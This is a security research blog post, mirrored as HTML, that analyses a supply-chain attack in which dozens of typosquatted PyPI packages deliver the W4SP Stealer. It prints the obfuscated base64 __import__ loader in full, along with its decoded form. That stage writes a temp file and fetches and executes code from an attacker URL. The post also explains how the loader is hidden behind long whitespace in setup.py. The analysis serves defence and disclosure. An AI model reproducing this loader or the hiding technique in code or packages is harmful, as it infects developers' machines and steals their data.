<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.phylum.io/phylum-discovers-dozens-more-pypi-packages-attempting-to-deliver-w4sp-stealer-in-ongoing-supply-chain-attack">Original</a>
    <h1>Dozens of malicious PyPI packages discovered targeting developers</h1>
    
    <div id="readability-page-1" class="page"><div data-widget-type="cell" data-x="0" data-w="8">

                    <article>
                      <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Last week, our automated risk detection platform alerted us to some suspicious activity in dozens of newly published PyPI packages. It appears that these packages are a more sophisticated attempt to deliver the W4SP Stealer on to Python developer’s machines by hiding a malicious __import__ . Join us here on the Phylum research team as we investigate these new and shifting tactics the attacker is using to deploy W4SP stealer in this supply-chain attack.</p>
<!--more-->
<h4>The <code>__import__</code> Injection</h4>
<p>Similar to this attacker’s previous attempts, this particular attack starts by copying existing popular libraries and simply injecting a malicious <span><code>__import__</code></span> statement into an otherwise healthy codebase. The benefit this attacker gained from copying an existing legitimate package, is that because the PyPI landing page for the package is generated from the setup.py and the README.md, they immediately have a real looking landing page with mostly working links and the whole bit. Unless thoroughly inspected, a brief glance might lead one to believe this is also a legitimate package.</p>
<p>Here’s the PyPI landing page for the malicious package <code>typesutil</code>. You can see the attacker just copied the <code>datetime2</code> package and made a few slight modifications in an effort to make the text consistent with the phony package name it was published under.</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/image-1.png?width=582&amp;height=584&amp;name=image-1.png" alt="image-1" width="582" height="584" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image-1.png?width=291&amp;height=292&amp;name=image-1.png 291w, https://blog.phylum.io/hs-fs/hubfs/image-1.png?width=582&amp;height=584&amp;name=image-1.png 582w, https://blog.phylum.io/hs-fs/hubfs/image-1.png?width=873&amp;height=876&amp;name=image-1.png 873w, https://blog.phylum.io/hs-fs/hubfs/image-1.png?width=1164&amp;height=1168&amp;name=image-1.png 1164w, https://blog.phylum.io/hs-fs/hubfs/image-1.png?width=1455&amp;height=1460&amp;name=image-1.png 1455w, https://blog.phylum.io/hs-fs/hubfs/image-1.png?width=1746&amp;height=1752&amp;name=image-1.png 1746w" sizes="(max-width: 582px) 100vw, 582px"/></p>
<p>The main attack seems to have started around October 12, 2022, slowly picking up steam to a concentrated effort around October 22. Our system did, however, detect a small number of packages from July of 2022 that show similar IOC’s. The assumption is that this was an early POC effort, that is just now being executed in this fashion.</p>

<p>In the majority of packages, especially the earlier ones, the malicious import was simply injected into either the <code>setup.py</code> or the <code>__init__.py</code> as shown below on line 40. This screenshot is from <code>requests-httpx</code> which copied the <code>requests</code> package.</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/image%20(1).png?width=585&amp;height=606&amp;name=image%20(1).png" alt="image (1)" width="585" height="606" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(1).png?width=293&amp;height=303&amp;name=image%20(1).png 293w, https://blog.phylum.io/hs-fs/hubfs/image%20(1).png?width=585&amp;height=606&amp;name=image%20(1).png 585w, https://blog.phylum.io/hs-fs/hubfs/image%20(1).png?width=878&amp;height=909&amp;name=image%20(1).png 878w, https://blog.phylum.io/hs-fs/hubfs/image%20(1).png?width=1170&amp;height=1212&amp;name=image%20(1).png 1170w, https://blog.phylum.io/hs-fs/hubfs/image%20(1).png?width=1463&amp;height=1515&amp;name=image%20(1).png 1463w, https://blog.phylum.io/hs-fs/hubfs/image%20(1).png?width=1755&amp;height=1818&amp;name=image%20(1).png 1755w" sizes="(max-width: 585px) 100vw, 585px"/></p>
<h2>Too                 Many                    Spaces</h2>
<p>As this and other similar attempts were taken down, the attacker changed tactics slightly, and instead of just dumping the import in an obvious spot, it was placed waaaaay off screen, taking advantage of Python’s seldomly used semicolon to sneak the malicious code onto the same line as other legitimate code. Here’s a screenshot of <code>setup.py</code> from the malicious package <code>typesutil</code>. Upon first glance, nothing seems out of the ordinary here.</p>
<p><img src="https://blog.phylum.io/hubfs/image%20(2).png" alt="image (2)" width="0" height="0" loading="lazy"/></p>
<img src="https://blog.phylum.io/hs-fs/hubfs/image%20(2).png?width=687&amp;height=857&amp;name=image%20(2).png" alt="image (2)" width="687" height="857" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(2).png?width=344&amp;height=429&amp;name=image%20(2).png 344w, https://blog.phylum.io/hs-fs/hubfs/image%20(2).png?width=687&amp;height=857&amp;name=image%20(2).png 687w, https://blog.phylum.io/hs-fs/hubfs/image%20(2).png?width=1031&amp;height=1286&amp;name=image%20(2).png 1031w, https://blog.phylum.io/hs-fs/hubfs/image%20(2).png?width=1374&amp;height=1714&amp;name=image%20(2).png 1374w, https://blog.phylum.io/hs-fs/hubfs/image%20(2).png?width=1718&amp;height=2143&amp;name=image%20(2).png 1718w, https://blog.phylum.io/hs-fs/hubfs/image%20(2).png?width=2061&amp;height=2571&amp;name=image%20(2).png 2061w" sizes="(max-width: 687px) 100vw, 687px"/>
<p>However, if you widen up your code editor window (or just turn on word wrapping) you’ll see the <code>__import__</code> way off in right field. For those counting at home, it was offset by 318 spaces….</p>
<p><img src="https://blog.phylum.io/hubfs/image%20(3).png" alt="image (3)" width="0" height="0" loading="lazy"/><img src="https://blog.phylum.io/hs-fs/hubfs/image%20(3).png?width=2000&amp;height=519&amp;name=image%20(3).png" alt="image (3)" width="2000" height="519" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(3).png?width=1000&amp;height=260&amp;name=image%20(3).png 1000w, https://blog.phylum.io/hs-fs/hubfs/image%20(3).png?width=2000&amp;height=519&amp;name=image%20(3).png 2000w, https://blog.phylum.io/hs-fs/hubfs/image%20(3).png?width=3000&amp;height=779&amp;name=image%20(3).png 3000w, https://blog.phylum.io/hs-fs/hubfs/image%20(3).png?width=4000&amp;height=1038&amp;name=image%20(3).png 4000w, https://blog.phylum.io/hs-fs/hubfs/image%20(3).png?width=5000&amp;height=1298&amp;name=image%20(3).png 5000w, https://blog.phylum.io/hs-fs/hubfs/image%20(3).png?width=6000&amp;height=1557&amp;name=image%20(3).png 6000w" sizes="(max-width: 2000px) 100vw, 2000px"/></p>
<h4>A Simple <code>pip</code></h4>
<p>In a few packages, the attacker attempted to evade detection without using the <code>__import__</code> statement at all. Instead, they used the <code>setup.py</code> file to try and <code>pip install</code> one of the other malicious packages that <em>did</em> have the malicious code. Here’s a screenshot from the malicious package <code>duonet</code>:</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/image%20(5).png?width=730&amp;height=1064&amp;name=image%20(5).png" alt="image (5)" width="730" height="1064" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(5).png?width=365&amp;height=532&amp;name=image%20(5).png 365w, https://blog.phylum.io/hs-fs/hubfs/image%20(5).png?width=730&amp;height=1064&amp;name=image%20(5).png 730w, https://blog.phylum.io/hs-fs/hubfs/image%20(5).png?width=1095&amp;height=1596&amp;name=image%20(5).png 1095w, https://blog.phylum.io/hs-fs/hubfs/image%20(5).png?width=1460&amp;height=2128&amp;name=image%20(5).png 1460w, https://blog.phylum.io/hs-fs/hubfs/image%20(5).png?width=1825&amp;height=2660&amp;name=image%20(5).png 1825w, https://blog.phylum.io/hs-fs/hubfs/image%20(5).png?width=2190&amp;height=3192&amp;name=image%20(5).png 2190w" sizes="(max-width: 730px) 100vw, 730px"/></p>
<p>You can see the <code>pip install</code> on lines 5 and 6. Aside from the fact that package requirements should go in a <code>requirements.txt</code> or similar file, the fact that this <code>setup.py</code> is <code>pip install</code>ing a benign sounding <code>typesutil</code> wouldn’t immediately raise too many alarms from visual inspection alone.</p>
<p>Here’s a list of packages we’ve turned up so far that either contain the strange import directly, or attempt to <code>pip install</code> one of the packages with the strange import:</p>
<ul>
<li><code>typesutil</code></li>
<li><code>typestring</code></li>
<li><code>sutiltype</code></li>
<li><code>duonet</code></li>
<li><code>fatnoob</code></li>
<li><code>strinfer</code></li>
<li><code>pydprotect</code></li>
<li><code>incrivelsim</code></li>
<li><code>twyne</code></li>
<li><code>pyptext</code></li>
<li><code>installpy</code></li>
<li><code>faq</code></li>
<li><code>colorwin</code></li>
<li><code>requests-httpx</code></li>
<li><code>colorsama</code></li>
<li><code>shaasigma</code></li>
<li><code>stringe</code></li>
<li><code>felpesviadinho</code></li>
<li><code>cypress</code></li>
<li><code>pystyte</code></li>
<li><code>pyslyte</code></li>
<li><code>pystyle</code></li>
<li><code>pyurllib</code></li>
<li><code>algorithmic</code></li>
<li><code>oiu</code></li>
<li><code>iao</code></li>
<li><code>curlapi</code></li>
<li><code>type-color</code></li>
<li><code>pyhints</code></li>
</ul>

<p>Regardless of <em>how</em> these packages are infecting machines, once they do, they all do the same thing and it all comes down to this strange looking import (or something very similar to this; sometimes it differs slightly because the attacker uses several different URLs to pull their next bit of malicious code from—more about that below):</p>
<pre><code>
__import__(&#39;builtins&#39;).exec(__import__(&#39;builtins&#39;).compile(__import__(&#39;base64&#39;).b64decode(&#34;ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9GdTY0M1h6YVNibUNjbkdOJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw==&#34;),&#39;&lt;string&gt;&#39;,&#39;exec&#39;))
</code></pre>
<p>First let’s understand what this method chain is doing. To start with, there’s a lengthy Base64 encoded string that gets decoded. Then that decoded string gets compiled into a code object (see the <a href="%5B%3Chttps://docs.python.org/3/library/functions.html?highlight=compile#compile%3E%5D(%3Chttps://docs.python.org/3/library/functions.html?highlight=compile#compile%3E)">python docs</a> on <code>compile</code> for more info on that). That code object is then executed.</p>
<p>Now that we know something is being executed, let’s figure out what that is. Let’s start by decoding the Base64 string. Doing so yields:</p>
<pre><code>
b&#39;from tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b&#34;&#34;&#34;from urllib.request import urlopen as _uurlopen;exec(_uurlopen(\&#39;http://wasp.plague.fun/inject/Fu643XzaSbmCcnGN\&#39;).read())&#34;&#34;&#34;)\n_ttmp.close()\ntry: _ssystem(f&#34;start {_eexecutable.replace(\&#39;.exe\&#39;, \&#39;w.exe\&#39;)} {_ttmp.name}&#34;)\nexcept: pass&#39;
</code></pre>
<p>Interesting, looks like some Python code. Formatting this nicely for readability will show us what this is doing:</p>
<pre><code>
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem

_ttmp = _ffile(delete=False)
_ttmp.write(b&#34;&#34;&#34;from urllib.request import urlopen as _uurlopen;exec(_uurlopen(\&#39;http://wasp.plague.fun/inject/Fu643XzaSbmCcnGN\&#39;).read())&#34;&#34;&#34;)
_ttmp.close()

try:
    _ssystem(f&#34;start {_eexecutable.replace(&#39;.exe&#39;, &#39;w.exe&#39;)} {_ttmp.name}&#34;)
except:
    pass
</code></pre>
<p>First it imports <code>tempfile</code> which, as the name suggests, allows for the easy creation of temporary files. Then it imports <code>executable</code> from <code>sys</code> which provides the absolute path of the executable binary for the Python interpreter on the machine. And finally it imports <code>system</code> from <code>os</code> which allows execution of commands in a subshell.</p>
<p>After all those imports it then goes on to create a temporary file, into which it writes the following (again, formatted for readability):</p>
<pre><code>
from urllib.request import urlopen as _uurlopen
exec(_uurlopen(&#39;http://wasp.plague.fun/inject/Fu643XzaSbmCcnGN&#39;).read())
</code></pre>

<p>And finally, it then attempts to run the temp file, which is now another Python script. Notice that it runs the script with <code>pythonw.exe</code> (notice the “w”) and not <code>python.exe</code>. The difference between the the two is that <code>pythonw.exe</code> will <em>not</em> open a console window when run—an obvious attempt to hide whatever this code is doing from the machine’s user.</p>
<p>You’ll notice that this <em>again</em> runs <code>exec</code> on whatever is returned from the URL. So what’s at the URL? Some lightly obfuscated Python code. Here’s a snippet of what it looks like:</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/image%20(11).png?width=714&amp;height=364&amp;name=image%20(11).png" alt="image (11)" width="714" height="364" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(11).png?width=357&amp;height=182&amp;name=image%20(11).png 357w, https://blog.phylum.io/hs-fs/hubfs/image%20(11).png?width=714&amp;height=364&amp;name=image%20(11).png 714w, https://blog.phylum.io/hs-fs/hubfs/image%20(11).png?width=1071&amp;height=546&amp;name=image%20(11).png 1071w, https://blog.phylum.io/hs-fs/hubfs/image%20(11).png?width=1428&amp;height=728&amp;name=image%20(11).png 1428w, https://blog.phylum.io/hs-fs/hubfs/image%20(11).png?width=1785&amp;height=910&amp;name=image%20(11).png 1785w, https://blog.phylum.io/hs-fs/hubfs/image%20(11).png?width=2142&amp;height=1092&amp;name=image%20(11).png 2142w" sizes="(max-width: 714px) 100vw, 714px"/></p>
<p>For reference, the entire file is ~21K characters. However, all it really comes down to is a handful of <code>lambda</code>s and a long compressed byte object. This is pretty typical Python obfuscation—long, hard-to-distinguish variable names, a number of <code>lambda</code> functions, hex-encoding, raw bytes, etc. Without going into the nitty gritty of this one, the gist is that it calls <code>zlib.decompress()</code> on a long compressed byte object and executes it. The result of the decompression…</p>
<h2>MORE OBFUSCATED PYTHON 😵‍💫</h2>
<p>And this time it looks really nasty. It’s okay, though, I’m hourly so let’s go! Here’s a snippet:</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/image%20(6).png?width=1569&amp;height=872&amp;name=image%20(6).png" alt="image (6)" width="1569" height="872" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(6).png?width=785&amp;height=436&amp;name=image%20(6).png 785w, https://blog.phylum.io/hs-fs/hubfs/image%20(6).png?width=1569&amp;height=872&amp;name=image%20(6).png 1569w, https://blog.phylum.io/hs-fs/hubfs/image%20(6).png?width=2354&amp;height=1308&amp;name=image%20(6).png 2354w, https://blog.phylum.io/hs-fs/hubfs/image%20(6).png?width=3138&amp;height=1744&amp;name=image%20(6).png 3138w, https://blog.phylum.io/hs-fs/hubfs/image%20(6).png?width=3923&amp;height=2180&amp;name=image%20(6).png 3923w, https://blog.phylum.io/hs-fs/hubfs/image%20(6).png?width=4707&amp;height=2616&amp;name=image%20(6).png 4707w" sizes="(max-width: 1569px) 100vw, 1569px"/></p>
<p>For reference, this mess clocks in at around 71K characters so there’s quite a bit of mud we have to trudge through here. But again, this is pretty typical for obfuscated Python. As we were working through this, however, it became evident that something wasn’t quite right. Perhaps the code was too obfuscated for its own good? We couldn’t get it to do anything other than produce syntax errors and tacked it to our wall of “malware that doesn’t work” (read more about malware that doesn’t work in another post <a href="https://blog.phylum.io/open-source-malware-is-bad-and-you-should-feel-bad">here</a>). We suspect the attacker recognized this as well because after this, their tactics changed once again.</p>

<p>In one of the most recently discovered packages <code>cypress</code> the attacker appears to have removed one layer of complication from this attack. In this package, the early stages are identical up until the part where it retrieves code from the URL. This time, they pull the code directly from a public GitHub repo called <code>inject</code> that belongs to a user called “Quiriky”.</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/image%20(7).png?width=1360&amp;height=649&amp;name=image%20(7).png" alt="image (7)" width="1360" height="649" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(7).png?width=680&amp;height=325&amp;name=image%20(7).png 680w, https://blog.phylum.io/hs-fs/hubfs/image%20(7).png?width=1360&amp;height=649&amp;name=image%20(7).png 1360w, https://blog.phylum.io/hs-fs/hubfs/image%20(7).png?width=2040&amp;height=974&amp;name=image%20(7).png 2040w, https://blog.phylum.io/hs-fs/hubfs/image%20(7).png?width=2720&amp;height=1298&amp;name=image%20(7).png 2720w, https://blog.phylum.io/hs-fs/hubfs/image%20(7).png?width=3400&amp;height=1623&amp;name=image%20(7).png 3400w, https://blog.phylum.io/hs-fs/hubfs/image%20(7).png?width=4080&amp;height=1947&amp;name=image%20(7).png 4080w" sizes="(max-width: 1360px) 100vw, 1360px"/></p>
<p>The code it pulls this time actually looks like real code! Strange code, to be sure, but actual code. Unsurprisingly, it claims to have been obfuscated with Hyperion…</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/image%20(8).png?width=841&amp;height=1279&amp;name=image%20(8).png" alt="image (8)" width="841" height="1279" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(8).png?width=421&amp;height=640&amp;name=image%20(8).png 421w, https://blog.phylum.io/hs-fs/hubfs/image%20(8).png?width=841&amp;height=1279&amp;name=image%20(8).png 841w, https://blog.phylum.io/hs-fs/hubfs/image%20(8).png?width=1262&amp;height=1919&amp;name=image%20(8).png 1262w, https://blog.phylum.io/hs-fs/hubfs/image%20(8).png?width=1682&amp;height=2558&amp;name=image%20(8).png 1682w, https://blog.phylum.io/hs-fs/hubfs/image%20(8).png?width=2103&amp;height=3198&amp;name=image%20(8).png 2103w, https://blog.phylum.io/hs-fs/hubfs/image%20(8).png?width=2523&amp;height=3837&amp;name=image%20(8).png 2523w" sizes="(max-width: 841px) 100vw, 841px"/></p>
<p>And let’s not forgot what a big fan of whitespace this attacker is. Scrolling to the right reveals:</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/image%20(9).png?width=2000&amp;height=832&amp;name=image%20(9).png" alt="image (9)" width="2000" height="832" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(9).png?width=1000&amp;height=416&amp;name=image%20(9).png 1000w, https://blog.phylum.io/hs-fs/hubfs/image%20(9).png?width=2000&amp;height=832&amp;name=image%20(9).png 2000w, https://blog.phylum.io/hs-fs/hubfs/image%20(9).png?width=3000&amp;height=1248&amp;name=image%20(9).png 3000w, https://blog.phylum.io/hs-fs/hubfs/image%20(9).png?width=4000&amp;height=1664&amp;name=image%20(9).png 4000w, https://blog.phylum.io/hs-fs/hubfs/image%20(9).png?width=5000&amp;height=2080&amp;name=image%20(9).png 5000w, https://blog.phylum.io/hs-fs/hubfs/image%20(9).png?width=6000&amp;height=2496&amp;name=image%20(9).png 6000w" sizes="(max-width: 2000px) 100vw, 2000px"/></p>
<p>Or with word wrapping on:</p>
<p><img src="https://blog.phylum.io/hs-fs/hubfs/image%20(10).png?width=1949&amp;height=1212&amp;name=image%20(10).png" alt="image (10)" width="1949" height="1212" loading="lazy" srcset="https://blog.phylum.io/hs-fs/hubfs/image%20(10).png?width=975&amp;height=606&amp;name=image%20(10).png 975w, https://blog.phylum.io/hs-fs/hubfs/image%20(10).png?width=1949&amp;height=1212&amp;name=image%20(10).png 1949w, https://blog.phylum.io/hs-fs/hubfs/image%20(10).png?width=2924&amp;height=1818&amp;name=image%20(10).png 2924w, https://blog.phylum.io/hs-fs/hubfs/image%20(10).png?width=3898&amp;height=2424&amp;name=image%20(10).png 3898w, https://blog.phylum.io/hs-fs/hubfs/image%20(10).png?width=4873&amp;height=3030&amp;name=image%20(10).png 4873w, https://blog.phylum.io/hs-fs/hubfs/image%20(10).png?width=5847&amp;height=3636&amp;name=image%20(10).png 5847w" sizes="(max-width: 1949px) 100vw, 1949px"/></p>
<p>Okay, cool, a bunch of compressed byte objects again. This time, they’re mixed into whatever this pretend <code>_callfuncion</code> class is. Or I guess it’s only kind of pretend because the malicious parts of the code are actually passed as keyword arguments to some of the class methods, so it’s actually doing some work. Thankfully, we didn’t find more obfuscated code when working through this. This time, what we discovered is that there are 14 big compressed byte objects that each get passed to the <code>_callfunction.Statistics</code> method which effectively just stores them as variables. Then later on in the code if this condition passes <code>elif 107990 &lt; 3594010</code> (spoiler alert, it always does) a bunch of <code>lambdas</code> are used to <code>decompress</code> and <code>exec</code> the data in some specified order. The result ultimately appears to be deployment of the W4SP Stealer.</p>

<p>As a wrap up, let’s re-hash exactly how this supply-chain attack is executed:</p>
<ol>
<li>There are dozens of packages actively being published on PyPI with benign-sounding names (some are typosquats) that blatantly copy existing legitimate packages and tries to sneak in a small snippet of malicious code.</li>
<li>The malicious code is a hidden <code>__import__</code> statement in the package’s <code>setup.py</code>, <code>__init__.py</code>, or we’ve even seen it injected into custom error classes. Regardless, it contains a Base64 encoded string that gets executed. Sometimes instead of the import directly in these files, it could just be an <code>os.system()</code> call that <code>pip install</code>s one of their other malicious packages.</li>
<li>Decoded, that Base64 encoded string contains a Python script that is written to a temporary file that is executed.</li>
<li>That temporary file contains code that reaches out to any number of URLs.</li>
<li>From each URL it pulls lightly obfuscated Python code that executes a compressed byte object.</li>
<li>Decompressed, that byte object contains the W4SP Stealer malware that is deployed on the system.</li>
</ol>
<p>As this is an ongoing attack with constantly changing tactics from a determined attacker, we suspect to see more malware like this popping up in the near future. So stay tuned as we discover and uncover more from this highly active supply-chain attack!</p>

<p>According to the PyPI download counter <a href="http://pepy.tech">pepy.tech</a>, as of publication, collectively the packages listed above account for over 5700 downloads. Notice that some of the packages appear to be obvious attempts at typosquatting like <code>twyne</code> and <code>colorsama</code> (which squats on <code>twine</code> and <code>colorama</code> respectively) which together account for hundreds of millions of downloads per month.</p>
</span>
                      </p>
                    </article>
									 									 									 
								 
                 
                  
									 
                
									 
                
                    

                </div></div>
  </body>
</html>
